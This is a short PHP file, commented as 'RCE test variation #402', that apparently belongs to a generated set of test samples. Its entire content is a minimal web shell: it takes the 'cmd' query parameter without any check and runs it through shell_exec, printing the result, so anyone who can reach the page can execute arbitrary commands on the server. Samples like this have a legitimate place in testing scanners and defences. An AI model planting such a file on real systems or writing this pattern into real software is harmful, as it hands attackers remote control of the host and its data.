<?php
// RCE test variation #402
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>